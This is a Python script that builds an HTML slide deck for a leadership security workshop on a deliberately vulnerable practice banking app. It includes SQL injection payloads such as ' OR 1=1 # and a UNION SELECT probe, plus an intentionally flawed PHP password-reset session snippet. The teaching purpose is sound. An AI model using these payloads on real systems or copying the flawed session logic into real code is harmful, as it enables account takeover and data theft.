#!/usr/bin/env python3
"""Build Leadership_Lab_Workshop.html from Leadership_Lab_Enhanced.html.

Keeps the original's head/CSS and the slides worth keeping, replaces/adds the
rest, and installs a slide show/hide manager so the presenter can flex on time.
"""
import re, os, sys

SRC = '/Users/ankit/Documents/GitHub/Banksploit-Advanced/Leadership_Lab_Enhanced.html'
OUT = '/Users/ankit/Documents/GitHub/Banksploit-Advanced/Leadership_Lab_Workshop.html'

src = open(SRC, encoding='utf-8').read()

# ---- extract original slides by id -------------------------------------------
pat = re.compile(r'(<section class="slide[^"]*" id="s(\d+)">.*?</section>)', re.S)
orig = {}
first = None
for m in pat.finditer(src):
    orig[int(m.group(2))] = m.group(1)
    if first is None:
        first = m.start()
head = src[:first]

# ---- Consistency patches to reused original slides ----
# L11 punchline: restyle to match the red "moment" treatment used by every other lab.
orig[43] = orig[43].replace(
    '<h2>Client-side code is not secret.</h2>',
    '<h1 style="color:var(--red);font-size:clamp(1.5rem,2.9vw,2.3rem)">Client-side code is not secret.</h1>')
# G9 org tie-in: same heading as every other lab's tie-in slide.
orig[37] = orig[37].replace(
    '<h3 class="mb2">Defence in Depth</h3>',
    '<h3 class="mb2">Who Should Have Caught This?</h3>')

# Uniform "Demo N" badges across all eight labs (deck order: G1 L11 L25 L12 L1 G2 G4 G9).
# The originals used "Exercise" for L11/L1 and left two blocks both numbered "Demo 3".
orig[39] = orig[39].replace(
    '<span class="badge badge-yellow">\U0001f7e1 Exercise 1</span>',
    '<span class="badge badge-red">&#128308; Demo 2</span>').replace(
    '<div class="mt3 flex-row" style="justify-content:center;gap:1.2rem">\n'
    '<p class="desc" style="font-size:1.1rem">⏱️ 8 minutes. Work in pairs if you\'d like.</p>\n'
    '<button class="timer-btn" onclick="timerStart(480)">▶ Start 8:00</button>\n'
    '</div>', '')
orig[44] = orig[44].replace(
    '<span class="badge badge-yellow">\U0001f7e1 Exercise 2</span>',
    '<span class="badge badge-red">&#128308; Demo 5</span>').replace(
    '<div class="mt3 flex-row" style="justify-content:center;gap:1.2rem">\n'
    '<p class="desc" style="font-size:1.1rem">⏱️ 10 minutes.</p>\n'
    '<button class="timer-btn" onclick="timerStart(600)">▶ Start 10:00</button>\n'
    '</div>', '')
orig[31] = orig[31].replace(
    '<span class="badge badge-red">\U0001f534 Demo 3</span>',
    '<span class="badge badge-red">&#128308; Demo 8</span>')

# MySQL uses '#' for line comments; swap the '-- ' shown in the SQLi slides.
orig[19] = (orig[19]
    .replace("BS100234' -- ", "BS100234' #")
    .replace('class="vuln-hl"> -- \'', 'class="vuln-hl"> #\'')
    .replace('<code>--</code> turns the password', '<code>#</code> turns the password'))
orig[22] = orig[22].replace("<code>' OR 1=1 --</code>", "<code>' OR 1=1 #</code>")
orig[56] = (orig[56]
    .replace("BS100234' -- ", "BS100234' #")
    .replace("' OR 1=1 -- ", "' OR 1=1 #")
    .replace("' UNION SELECT 1,2,3,4 -- ", "' UNION SELECT 1,2,3,4 #"))

# ---- extra CSS ----------------------------------------------------------------
EXTRA_CSS = r'''
/* ─── Real-world incident ─── */
.rw{background:linear-gradient(135deg,rgba(239,68,68,.09),rgba(244,63,94,.03));border:1px solid rgba(239,68,68,.25);border-radius:14px;padding:1.3rem 1.6rem}
.rw-tag{display:inline-flex;align-items:center;gap:.4rem;font-size:.7rem;font-weight:800;letter-spacing:.08em;text-transform:uppercase;color:#fca5a5;background:rgba(239,68,68,.15);border:1px solid rgba(239,68,68,.3);padding:.25rem .7rem;border-radius:999px}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(118px,1fr));gap:.7rem;margin-top:1.1rem}
.stat{text-align:center;background:rgba(8,12,24,.65);border:1px solid #1e293b;border-radius:10px;padding:.8rem .5rem}
.stat-n{font-size:clamp(1.15rem,2.3vw,1.8rem);font-weight:800;color:var(--red);font-variant-numeric:tabular-nums;line-height:1.1}
.stat-l{font-size:.7rem;color:var(--t3);margin-top:.3rem;line-height:1.3}
/* ─── URL bar ─── */
.urlbar{display:flex;align-items:center;gap:.6rem;background:#080c18;border:1px solid #1e293b;border-radius:8px;padding:.6rem .9rem;font-family:var(--mono);font-size:clamp(.75rem,1.1vw,.92rem);overflow-x:auto;white-space:nowrap}
/* ─── JWT ─── */
.jwt{display:flex;flex-wrap:wrap;gap:.3rem;font-family:var(--mono);font-size:clamp(.7rem,1vw,.84rem);word-break:break-all}
.jwt span{padding:.3rem .5rem;border-radius:5px}
.jwt .jh{background:rgba(239,68,68,.18);color:#fca5a5}
.jwt .jp{background:rgba(99,102,241,.18);color:#a5b4fc}
.jwt .js{background:rgba(34,197,94,.18);color:#86efac}
.jwt .jx{background:rgba(100,116,139,.2);color:var(--t3);text-decoration:line-through}
/* ─── Attack chain ─── */
.chain{display:flex;align-items:stretch;gap:.35rem;flex-wrap:wrap;margin-top:1rem}
.chain-step{flex:1;min-width:112px;background:var(--card);border:1px solid #1e293b;border-left:3px solid var(--red);border-radius:9px;padding:.7rem .75rem}
.cs-id{font-size:.62rem;font-weight:800;color:var(--red);letter-spacing:.05em}
.cs-t{font-size:.82rem;color:var(--t1);font-weight:600;margin-top:.15rem;line-height:1.25}
.cs-d{font-size:.7rem;color:var(--t3);margin-top:.2rem;line-height:1.3}
.beats .cs-id{font-size:.74rem}
.beats .cs-t{font-size:1rem;margin-top:.25rem}
.beats .cs-d{font-size:.84rem;margin-top:.3rem}
.beats .chain-step{padding:.85rem .95rem}
/* ─── Your Turn ─── */
.yt{background:linear-gradient(135deg,rgba(234,179,8,.09),rgba(99,102,241,.05));border:1px solid rgba(234,179,8,.3);border-radius:14px;padding:1.3rem 1.6rem}
/* ─── Slide manager ─── */
#mgr-btn{position:fixed;bottom:1.1rem;right:6.5rem;z-index:99;background:rgba(25,35,65,.75);border:1px solid rgba(99,102,241,.3);color:var(--t2);border-radius:8px;padding:.3rem .7rem;font-size:.72rem;cursor:pointer;font-family:var(--sans);font-weight:600}
#mgr-btn:hover{color:var(--t1);border-color:rgba(99,102,241,.6)}
#feedback-btn{position:fixed;bottom:3.4rem;right:2rem;z-index:99;
  background:linear-gradient(135deg,var(--indigo),var(--sky));color:#fff;border:none;
  border-radius:10px 10px 4px 10px;padding:.55rem 1.05rem;font-size:.76rem;font-weight:700;letter-spacing:.02em;
  text-decoration:none;font-family:var(--sans);
  display:inline-flex;align-items:center;gap:.45rem;
  box-shadow:0 4px 18px rgba(56,189,248,.35);
  opacity:0;pointer-events:none;transform:translateY(10px) scale(.96);
  transition:opacity .45s ease,transform .45s ease}
#feedback-btn.show{opacity:1;pointer-events:auto;transform:translateY(0) scale(1);
  animation:fbPulse 2.2s ease-in-out .6s 3}
#feedback-btn:hover{filter:brightness(1.12);box-shadow:0 6px 26px rgba(56,189,248,.6)}
#feedback-btn .fb-dot{width:.42rem;height:.42rem;border-radius:50%;background:#fff;opacity:.9;
  animation:fbDot 1.8s ease-in-out infinite}
@keyframes fbPulse{0%,100%{box-shadow:0 4px 18px rgba(56,189,248,.35)}
  50%{box-shadow:0 4px 30px rgba(56,189,248,.85)}}
@keyframes fbDot{0%,100%{opacity:.35}50%{opacity:1}}
#slide-mgr{position:fixed;inset:0;background:rgba(5,8,18,.95);z-index:200;display:none;flex-direction:column;padding:1.6rem 3vw 1.2rem;backdrop-filter:blur(6px)}
#slide-mgr.open{display:flex}
#mgr-list{overflow-y:auto;flex:1;margin-top:.9rem;display:grid;grid-template-columns:repeat(auto-fill,minmax(258px,1fr));gap:.35rem;align-content:start}
.mgr-row{display:flex;align-items:center;gap:.5rem;padding:.38rem .55rem;border-radius:7px;border:1px solid #1e293b;background:rgba(25,35,65,.45);cursor:pointer;font-size:.78rem;transition:border-color .15s}
.mgr-row:hover{border-color:rgba(99,102,241,.5)}
.mgr-row.off{opacity:.34}
.mgr-row.cur{border-color:rgba(56,189,248,.7)}
.mgr-row .mn{font-family:var(--mono);font-size:.68rem;color:var(--t3);min-width:1.6rem;text-align:right}
.mgr-row .mt{flex:1;color:var(--t1);line-height:1.22;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.mgr-row .mk{font-size:.56rem;text-transform:uppercase;letter-spacing:.04em;padding:.1rem .33rem;border-radius:4px;font-weight:800;flex-shrink:0}
.mk-handson{background:rgba(234,179,8,.22);color:#fde047}
.mk-real{background:rgba(239,68,68,.22);color:#fca5a5}
.mk-opt{background:rgba(100,116,139,.28);color:#94a3b8}
.mgr-bar{display:flex;gap:.45rem;flex-wrap:wrap;align-items:center}
.mgr-row .mn{min-width:1.9rem}
.mmove{display:flex;flex-direction:column;gap:1px;flex-shrink:0}
.mvb{background:rgba(99,102,241,.14);border:1px solid rgba(99,102,241,.25);color:#c7d2fe;border-radius:4px;line-height:1;padding:1px 4px;font-size:.55rem;cursor:pointer;font-family:var(--sans)}
.mvb:hover:not(:disabled){background:rgba(99,102,241,.4)}
.mvb:disabled{opacity:.2;cursor:default}
.mgr-preset{background:rgba(99,102,241,.16);border:1px solid rgba(99,102,241,.3);color:#c7d2fe;border-radius:7px;padding:.33rem .75rem;cursor:pointer;font-size:.74rem;font-weight:600;font-family:var(--sans)}
.mgr-preset:hover{background:rgba(99,102,241,.32)}
.mgr-close{margin-left:auto;background:transparent;border:1px solid #1e293b;color:var(--t3);border-radius:7px;padding:.33rem .8rem;cursor:pointer;font-size:.74rem;font-family:var(--sans)}
/* ─── Deep-Dive: explanation & solutions ─── */
.sol-head{display:flex;align-items:center;gap:1rem;flex-wrap:wrap}
.sol-tag{font-family:var(--mono);font-weight:800;font-size:clamp(1.1rem,2vw,1.5rem);color:#0b1120;background:var(--sky);padding:.16em .5em;border-radius:10px;min-width:2.8rem;text-align:center}
.sol-cwe{font-size:.76rem;color:var(--t3);font-weight:700;letter-spacing:.03em}
.sol-where{color:#7dd3fc;font-size:.92rem}
.sol-lvlbadge{font-weight:800;font-size:clamp(1.1rem,1.9vw,1.4rem)}
.sol-lvlbadge.l0{color:#fca5a5}.sol-lvlbadge.l1{color:#fcd34d}.sol-lvlbadge.l2{color:#7dd3fc}
.sol-ladder{display:flex;flex-direction:column;gap:.4rem}
.sol-lrow{display:flex;gap:.8rem;align-items:baseline;background:rgba(8,12,24,.5);border:1px solid #1e293b;border-radius:9px;padding:.45rem .8rem}
.sol-lk{font-family:var(--mono);font-weight:800;min-width:3.1rem;font-size:.9rem}
.sol-lrow:nth-child(1) .sol-lk{color:#fca5a5}.sol-lrow:nth-child(2) .sol-lk{color:#fcd34d}.sol-lrow:nth-child(3) .sol-lk{color:#7dd3fc}.sol-lrow:nth-child(4) .sol-lk{color:#86efac}
.sol-lv{color:var(--t2);font-size:.95rem}
.sol-code{background:#080c18;border:1px solid #1e293b;border-left:3px solid var(--sky);border-radius:10px;padding:1rem 1.2rem;margin:1.1rem 0;font-family:var(--mono);font-size:clamp(.8rem,1.15vw,1rem);line-height:1.6;white-space:pre-wrap;color:#cbd5e1;overflow-x:auto}
.sol-code .inj{color:#fde047;background:rgba(234,179,8,.18);border-radius:4px;padding:.02em .18em;font-weight:700}
.sol-code .cmt{color:#64748b;font-style:italic}
.sol-pay{background:rgba(234,179,8,.08);border:1px dashed rgba(234,179,8,.5);border-radius:9px;padding:.7rem 1rem;font-family:var(--mono);font-size:clamp(.9rem,1.3vw,1.1rem);color:#fde047;font-weight:700;word-break:break-all;user-select:all}
.sol-paynote{color:var(--t3);font-size:.9rem;margin-top:.4rem}
.sol-lesson{margin-top:1rem;background:rgba(56,189,248,.08);border:1px solid rgba(56,189,248,.3);border-radius:10px;padding:.8rem 1.1rem;color:#bae6fd}
.sol-note{margin-top:1rem;background:rgba(234,179,8,.08);border:1px solid rgba(234,179,8,.3);border-radius:10px;padding:.7rem 1rem;color:#fde68a;font-size:.95rem}
.sol-legend{display:flex;gap:.6rem;justify-content:center;flex-wrap:wrap}
.sol-pill{padding:.25em .9em;border-radius:999px;font-size:.82rem;font-weight:700;border:1px solid}
.sol-pill.l0{color:#fca5a5;border-color:rgba(239,68,68,.4)}.sol-pill.l1{color:#fcd34d;border-color:rgba(234,179,8,.4)}.sol-pill.l2{color:#7dd3fc;border-color:rgba(56,189,248,.4)}.sol-pill.l3{color:#86efac;border-color:rgba(34,197,94,.4)}
/* ─── Objective: the decisions leaders own ─── */
.obj-decide{display:flex;align-items:baseline;gap:.55rem;background:rgba(8,12,24,.4);border:1px solid #1e293b;border-left:3px solid var(--amber);border-radius:8px;padding:.5rem .85rem;font-size:clamp(.82rem,1.2vw,1rem);color:var(--t2);line-height:1.35}
.obj-v{font-weight:800;color:var(--amber);min-width:3.3rem;flex-shrink:0}
.obj4{display:grid;grid-template-columns:repeat(4,1fr);gap:1rem}
@media(max-width:900px){.obj4{grid-template-columns:1fr 1fr}}
'''

head = head.replace('</style>', EXTRA_CSS + '\n</style>')
# keep the two floating buttons out of printed/PDF output
head = head.replace('#progress,#counter,#fs-hint,#phase-tracker,#timer-widget{display:none}',
                    '#progress,#counter,#fs-hint,#phase-tracker,#timer-widget,#mgr-btn,#feedback-btn{display:none}')

# slide-manager markup + button, injected before the first slide
MGR_HTML = '''<button id="mgr-btn" onclick="mgrOpen()">☰ Slides</button>
<div id="slide-mgr">
<div class="mgr-bar">
<strong style="color:var(--t1);font-size:.95rem">Slide Manager</strong>
<span style="color:var(--t3);font-size:.74rem" id="mgr-count"></span>
<span style="width:.6rem"></span>
<button class="mgr-preset" onclick="mgrPreset('all')">Show all</button>
<button class="mgr-preset" onclick="mgrPreset('demo')">Demo only (hide Your Turn)</button>
<button class="mgr-preset" onclick="mgrPreset('short')">Short on time</button>
<button class="mgr-preset" onclick="mgrPreset('resetorder')">Reset order</button>
<button class="mgr-close" onclick="mgrClose()">Close (M / Esc)</button>
</div>
<div style="color:var(--t3);font-size:.72rem;margin-top:.45rem">Click a row to show/hide it. Hidden slides are skipped while presenting. Use &#9650;&#9660; to reorder. Double-click a row to jump to it. Hidden rows keep their place here; the live numbering on the left renumbers automatically. Remembered on this machine.</div>
<div id="mgr-list"></div>
</div>
'''
head = head + MGR_HTML

# Persistent feedback button — visible on every slide. Edit FEEDBACK_URL below.
FEEDBACK_URL = 'https://forms.example.com/REPLACE-ME'
FEEDBACK_HTML = ('<!-- ===== FEEDBACK BUTTON — replace the href below with your real form/QR link ===== -->\n'
  '<a id="feedback-btn" href="' + FEEDBACK_URL + '" target="_blank" rel="noopener">'
  '<span class="fb-dot"></span> Share your feedback</a>\n')
head = head + FEEDBACK_HTML

# ---- helpers ------------------------------------------------------------------
def prep(html, num, kind=None, hidden=False):
    html = re.sub(r'\s+id="s\d+"', '', html, count=1)
    attrs = ' id="s%d"' % num
    if kind:
        attrs += ' data-kind="%s"' % kind
    if hidden:
        attrs += ' data-default-hidden="1"'
    return html.replace('<section class="slide', '<section' + attrs + ' class="slide', 1)

def realworld(title, lead, stats, question, extra=None):
    st = ''.join('<div class="stat"><div class="stat-n">%s</div><div class="stat-l">%s</div></div>' % (n, l) for n, l in stats)
    ex = ''
    if extra:
        eh, et, flav = extra
        ex = ('<div class="card %s mt2" style="padding:.9rem 1.2rem"><h3 style="font-size:.95rem">%s</h3>'
              '<p class="desc mt1" style="font-size:.88rem">%s</p></div>') % (flav, eh, et)
    return '''<section class="slide"><div class="slide-inner">
<span class="rw-tag">&#9888; This actually happened</span>
<h2 class="mt2 mb1">%s</h2>
<div class="rw mt2">
<p class="desc" style="font-size:.97rem">%s</p>
<div class="stats">%s</div>
</div>
%s
<div class="card accent-left mt2" style="padding:.9rem 1.2rem"><p class="desc" style="font-size:.92rem"><strong style="color:var(--t1)">Leadership question:</strong> %s</p></div>
</div></section>''' % (title, lead, st, ex, question)

def whocaught(fn_blocks, closing):
    body = ''.join(
        '<div class="card accent-left%s"><h3 style="color:var(--indigo);font-size:1.02rem">%s</h3>%s</div>'
        % (' mt2' if i else '', name,
           ''.join('<p class="desc mt1" style="font-size:.9rem">%s</p>' % p for p in paras))
        for i, (name, paras) in enumerate(fn_blocks))
    return '''<section class="slide"><div class="slide-inner">
<h3 class="mb2">Who Should Have Caught This?</h3>
%s
<p class="mt2 big center" style="font-size:clamp(.95rem,1.6vw,1.2rem)">%s</p>
</div></section>''' % (body, closing)

def mindset_slide(vid, cwe, takeaway):
    # Standalone "Security Mindset" beat that caps each demo: shown AFTER the
    # attack lands and BEFORE the hands-on Your Turn retest.
    return '''<section class="slide"><div class="slide-inner">
<div class="flex-row mb2"><span class="badge badge-yellow">&#128161; Security Mindset</span><span style="color:var(--t3);font-size:.8rem">%s</span></div>
<h2 class="mb2">That worked. <span style="color:var(--amber)">Here is the thinking that stops it.</span></h2>
<p class="desc mb2">To the business this looked like normal functionality. The gap was never a typo &mdash; it was a piece of trust nobody noticed they had placed.</p>
<div class="grid3 gap2">
<div class="card red-left"><p class="sub mb1" style="color:var(--red)">The app trusted</p><p class="desc">%s</p></div>
<div class="card accent-left"><p class="sub mb1">Ask your team</p><p class="desc">%s</p></div>
<div class="card green-left"><p class="sub mb1" style="color:var(--green)">And that&rsquo;s why you now have</p><p class="desc">%s</p></div>
</div>
</div></section>''' % (cwe, takeaway['trust'], takeaway['ask'], takeaway['why'])

def yourturn(vid, headline, objective, secs=300, note='', retest=None):
    extra = '<p class="desc mt2" style="font-size:.85rem;color:var(--t3)">%s</p>' % note if note else ''
    mins = secs // 60
    if retest is None:
        retest = ('<strong style="color:var(--t1)">Now retest the fix.</strong> You reported this finding; '
                  'the developers have since shipped a fix. Confirm whether it actually holds &mdash; you have '
                  '<strong>no information</strong> about what they changed, and about %d minutes to try.' % mins)
    return '''<section class="slide"><div class="slide-inner">
<div class="flex-row mb2"><span class="badge badge-yellow">&#128993; Your Turn</span><span style="color:var(--t3);font-size:.8rem">%s &bull; Level 1 or 2 &bull; %d minutes</span></div>
<h2 class="mb2">%s</h2>
<div class="yt">
<div class="grid2 gap2">
<div>
<p class="sub mb1">The finding you reported</p>
<p class="desc">%s</p>
<div class="card red-left mt2" style="padding:.6rem .9rem"><p class="desc" style="font-size:.9rem">%s</p></div>
</div>
<div>
<p class="sub mb1">When it works</p>
<div class="step"><div class="step-num">1</div><div><p class="desc">The app reveals a <strong>flag</strong> &mdash; <code>BANKSPLOIT{...}</code></p></div></div>
<div class="step"><div class="step-num">2</div><div><p class="desc">Hit <strong>Claim</strong>, or paste it into Submit Flag</p></div></div>
<div class="step"><div class="step-num">3</div><div><p class="desc">Your points land on the leaderboard</p></div></div>
<button class="timer-btn mt2" onclick="timerStart(%d)">&#9654; Start %d:00 timer</button>
</div>
</div>
%s
</div>
</div></section>''' % (vid, mins, headline, objective, retest, secs, mins, extra)

# ============================ NEW CONTEXT SLIDES =============================
S_OBJECTIVE = '''<section class="slide"><div class="slide-inner">
<p class="sub mb1">Why you&rsquo;re in this room</p>
<h2 class="mb2">The security team finds the problem. <span style="color:var(--amber)">You decide what happens next.</span></h2>
<p class="desc mb2">You don&rsquo;t write the code or run the pen test. But these calls are yours &mdash; and they usually land under deadline pressure:</p>
<div style="display:grid;grid-template-columns:1fr 1fr;gap:.5rem .9rem">
<div class="obj-decide"><span class="obj-v">Accept</span> this risk &mdash; or don&rsquo;t</div>
<div class="obj-decide"><span class="obj-v">Test</span> before we ship &mdash; or go live now, pen-test later</div>
<div class="obj-decide"><span class="obj-v">Hold</span> the launch &mdash; or go live with the finding open</div>
<div class="obj-decide"><span class="obj-v">Patch</span> now &mdash; or carry the exposure</div>
<div class="obj-decide"><span class="obj-v">Fix</span> it now &mdash; or next quarter</div>
</div>
<div class="obj4 mt3">
<div class="card accent-left"><h3>Experience</h3><p class="desc mt1" style="font-size:.85rem">how a seemingly small technology decision creates a meaningful attack path &mdash; and real business risk</p></div>
<div class="card accent-left"><h3>Understand</h3><p class="desc mt1" style="font-size:.85rem">how attackers think, spot opportunities, and <strong style="color:var(--t1)">combine weaknesses</strong> into a full compromise</p></div>
<div class="card accent-left"><h3>See</h3><p class="desc mt1" style="font-size:.85rem">how AI is changing <strong style="color:var(--t1)">both offensive and defensive</strong> security &mdash; and what that means for your teams</p></div>
<div class="card accent-left"><h3>Leave with</h3><p class="desc mt1" style="font-size:.85rem">sharper questions to ask about security and technology risk <strong style="color:var(--t1)">before issues reach production</strong></p></div>
</div>
<p class="mt3 center" style="color:var(--t3);font-size:.92rem">The aim isn&rsquo;t to turn you into a penetration tester. It&rsquo;s that the next time one of these decisions reaches you, you weigh it on <strong style="color:var(--t2)">evidence you have seen first-hand</strong> &mdash; not a summary you cannot question.</p>
</div></section>'''

S_PATCH = '''<section class="slide"><div class="slide-inner">
<p class="sub mb1">Why your team keeps asking</p>
<h2 class="mb2">&ldquo;We just patched that. Why again?&rdquo; <span style="color:var(--amber)">Because attention is the vulnerability.</span></h2>
<div class="grid2 gap2">
<div class="card red-left"><h3>Attention concentrates</h3><p class="desc mt1" style="font-size:.9rem">One serious flaw marks a product as soft. Researchers &mdash; and attackers &mdash; pile onto the same code, so a product can sit quiet for years, then produce a <strong style="color:var(--t1)">cluster of CVEs in weeks</strong>. Where one bug surfaces, its siblings are usually next door.</p></div>
<div class="card red-left"><h3>The patch is the map</h3><p class="desc mt1" style="font-size:.9rem">Publishing a fix shows attackers <strong style="color:var(--t1)">exactly where the weakness was</strong>. They reverse it in hours &mdash; and routinely find the fix was incomplete, which becomes the next CVE.</p></div>
<div class="card red-left"><h3>Shared parts, shared pain</h3><p class="desc mt1" style="font-size:.9rem">Products are built on the same libraries. One flaw in a common component (Log4Shell, OpenSSL) lights up <strong style="color:var(--t1)">everything that bundles it &mdash; at once</strong>.</p></div>
<div class="card red-left"><h3>The window has collapsed</h3><p class="desc mt1" style="font-size:.9rem">A <em>zero-day</em> is exploited before a patch exists. The moment one is disclosed and patched it becomes an <em>N-day</em> &mdash; and the race is to apply the fix before attackers weaponise it, now a matter of <strong style="color:var(--t1)">hours</strong>. &ldquo;Patch now&rdquo; is the exploitation clock, not drama.</p></div>
</div>
<div class="card accent-left mt3" style="padding:.9rem 1.2rem"><p class="desc" style="font-size:.93rem"><strong style="color:var(--t1)">Leadership lens:</strong> frequent patching of the same product is not the team overreacting &mdash; it is the predictable cost of running a popular, internet-facing target. Patch SLAs and maintenance windows are how you stay ahead of an N-day; and a vendor&rsquo;s <strong style="color:var(--t1)">patch quality and track record is itself a risk decision</strong> &mdash; one you make when you choose a product, and every time you renew it.</p></div>
</div></section>'''

S_AGENDA = '''<section class="slide"><div class="slide-inner">
<h2 class="mb2">Agenda &mdash; 90 Minutes</h2>
<div class="flex-col" style="max-width:820px">
<div class="agenda-item"><div class="agenda-num" style="background:var(--indigo);color:#fff">1</div><div><strong style="color:var(--t1)">How attacks are actually built</strong> <span style="color:var(--t3)">&mdash; 8 min</span><br/><span style="color:var(--t2);font-size:.9rem">The threat economy, and the assumptions that create attack paths</span></div></div>
<div class="agenda-item"><div class="agenda-num" style="background:var(--red);color:#fff">2</div><div><strong style="color:var(--t1)">The lab: 8 vulnerabilities</strong> <span style="color:var(--t3)">&mdash; 50 min</span><br/><span style="color:var(--t2);font-size:.9rem">I demonstrate each at Level 0, you exploit it yourself at Level 1 or 2</span></div></div>
<div class="agenda-item"><div class="agenda-num" style="background:var(--red);color:#fff">3</div><div><strong style="color:var(--t1)">Combining weaknesses</strong> <span style="color:var(--t3)">&mdash; 5 min</span><br/><span style="color:var(--t2);font-size:.9rem">How today&rsquo;s eight findings chain into one full compromise</span></div></div>
<div class="agenda-item"><div class="agenda-num" style="background:var(--sky);color:#06202e">4</div><div><strong style="color:var(--t1)">AI in security: offence and defence</strong> <span style="color:var(--t3)">&mdash; 20 min</span><br/><span style="color:var(--t2);font-size:.9rem">What changed, what did not, and where humans still decide</span></div></div>
<div class="agenda-item"><div class="agenda-num" style="background:var(--green);color:#042713">5</div><div><strong style="color:var(--t1)">Questions to ask before production</strong> <span style="color:var(--t3)">&mdash; 7 min</span><br/><span style="color:var(--t2);font-size:.9rem">What you take back to design reviews, risk calls and release decisions</span></div></div>
</div>
</div></section>'''

S_HOW = '''<section class="slide"><div class="slide-inner">
<p class="sub mb1">How each lab works</p>
<h2>I show you. Then you do it yourself &mdash; on a harder setting.</h2>
<div class="grid3 mt3">
<div class="card level-card green-left"><span class="level-tag">Level 0</span><h3>I demonstrate</h3><p class="desc mt1">Follow along with me, step by step. The weakness is obvious and the path is clear.<br/><strong style="color:var(--t1)">No flag at this level</strong> &mdash; this one is about understanding.</p></div>
<div class="card level-card yellow-left"><span class="level-tag">Level 1 / 2</span><h3>You exploit it</h3><p class="desc mt1">I raise the difficulty from the admin panel. Same class of weakness, but the obvious shortcut is gone. You get about five minutes.</p></div>
<div class="card level-card red-left"><span class="level-tag">Score</span><h3>Capture the flag</h3><p class="desc mt1">Succeed and the application hands you a flag. Claim it and your points go on the leaderboard. Flags are unique to you.</p></div>
</div>
<p class="big center mt3">Everything is doable with a browser and its developer tools.<br/>No tooling to install, no command line required.</p>
<p class="sub center mt2">Ask questions the moment something does not make sense.<br/>If one of you is lost, several others are too.</p>
</div></section>'''

S_EIGHT = '''<section class="slide"><div class="slide-inner center">
<h1 class="gradient" style="font-size:clamp(1.8rem,3.8vw,2.9rem)">This bank has 8 critical vulnerabilities.</h1>
<p class="big mt2">None of them are visible from the user interface.</p>
<p class="big">Every one is exploitable with just a browser.</p>
<div class="grid3 mt3" style="gap:.6rem;text-align:left">
<div class="card" style="padding:.75rem 1rem"><strong style="color:var(--t1);font-size:.88rem">G1 &mdash; SQL injection</strong><p class="desc" style="font-size:.76rem;margin-top:.15rem">Log in as anyone, without a password</p></div>
<div class="card" style="padding:.75rem 1rem"><strong style="color:var(--t1);font-size:.88rem">L11 &mdash; OTP exposure</strong><p class="desc" style="font-size:.76rem;margin-top:.15rem">Defeat two-factor without a phone</p></div>
<div class="card" style="padding:.75rem 1rem"><strong style="color:var(--t1);font-size:.88rem">L25 &mdash; Session puzzling</strong><p class="desc" style="font-size:.76rem;margin-top:.15rem">Walk in half-authenticated</p></div>
<div class="card" style="padding:.75rem 1rem"><strong style="color:var(--t1);font-size:.88rem">L12 &mdash; JWT alg:none</strong><p class="desc" style="font-size:.76rem;margin-top:.15rem">Forge your own identity card</p></div>
<div class="card" style="padding:.75rem 1rem"><strong style="color:var(--t1);font-size:.88rem">L1 &mdash; IDOR</strong><p class="desc" style="font-size:.76rem;margin-top:.15rem">Move money out of another account</p></div>
<div class="card" style="padding:.75rem 1rem"><strong style="color:var(--t1);font-size:.88rem">G2 &mdash; SQL injection</strong><p class="desc" style="font-size:.76rem;margin-top:.15rem">Extract the whole customer database</p></div>
<div class="card" style="padding:.75rem 1rem"><strong style="color:var(--t1);font-size:.88rem">G4 &mdash; Reflected XSS</strong><p class="desc" style="font-size:.76rem;margin-top:.15rem">Turn the bank&rsquo;s page against its users</p></div>
<div class="card" style="padding:.75rem 1rem"><strong style="color:var(--t1);font-size:.88rem">G9 &mdash; Command injection</strong><p class="desc" style="font-size:.76rem;margin-top:.15rem">Take over the server itself</p></div>
</div>
</div></section>'''

# ======================= L25 — SESSION PUZZLING ==============================
L25_TITLE = '''<section class="slide"><div class="slide-inner">
<div class="flex-row mb2"><span class="badge badge-red">&#128308; Demo 3</span><span style="color:var(--t3);font-size:.8rem">L25 &bull; CWE-841 &bull; OWASP A07:2021</span></div>
<h1>Session Puzzling &mdash; Take Over an Account Through Password Reset</h1>
<p class="big mt2">&ldquo;We&rsquo;re going to log in as another customer &mdash; using nothing but the <em>Forgot password</em> page.&rdquo;</p>
</div></section>'''

L25_HOW = '''<section class="slide"><div class="slide-inner">
<h3 class="mb2">Password Recovery Is Not One Step. It Is a Conversation.</h3>
<p class="desc mb2">The <em>Forgot password</em> journey is built in stages. Each stage records something in your session &mdash; <strong>who</strong> you are recovering, and <strong>how far</strong> you have got.</p>
<div class="flow mt2">
<div class="flow-step"><strong>Step 1</strong><p class="desc mt1">Enter a Customer ID.<br/>Session notes <em>who</em> is being recovered.</p></div>
<div class="flow-arrow">&rarr;</div>
<div class="flow-step"><strong>Step 2</strong><p class="desc mt1">OTP verified.</p></div>
<div class="flow-arrow">&rarr;</div>
<div class="flow-step"><strong>Step 3</strong><p class="desc mt1">Security questions answered.<br/>Session marks progress <em>complete</em>.</p></div>
<div class="flow-arrow">&rarr;</div>
<div class="flow-step"><strong>Step 4</strong><p class="desc mt1">Set a new password.</p></div>
</div>
<div class="card yellow-left mt3"><p class="desc">The session is built up <strong style="color:var(--t1)">piece by piece</strong>. The question the attacker asks is simple: <em>what does step 4 do if I arrive holding progress that was never earned for the account I&rsquo;m now resetting?</em></p></div>
</div></section>'''

L25_ATTACK = '''<section class="slide"><div class="slide-inner">
<h3 class="mb1">The Vulnerable Code</h3>
<p class="desc mb2">The recovery flow tracks progress <em>separately</em> from the account being recovered &mdash; and never checks that they match.</p>
<div class="grid2 gap2">
<div>
<p class="sub mb1">Level 0 &mdash; step 1 signs you straight in <span style="color:var(--t3)">(the demo)</span></p>
<pre class="mt1"><code><span class="cm">// forgot.php — after looking up the Customer ID</span>
<span class="var">$_SESSION</span>[<span class="str">'user'</span>] = [
    <span class="str">'id'</span>  =&gt; <span class="var">$u</span>[<span class="str">'id'</span>],
    <span class="str">'role'</span> =&gt; <span class="var">$u</span>[<span class="str">'role'</span>],   <span class="cm">// now logged in as them</span>
];</code></pre>
<div class="card red-left mt2"><p class="desc" style="font-size:.9rem">Knowing a Customer ID is enough to <strong style="color:var(--red)">become that user</strong> &mdash; no password, OTP or questions are checked first.</p></div>
</div>
<div>
<p class="sub mb1">Level 1 / 2 &mdash; the reset gate <span style="color:var(--t3)">(your turn)</span></p>
<pre class="mt1"><code><span class="cm">// Step 4 — may I open the reset form?</span>
<span class="var">$gateOpen</span> =
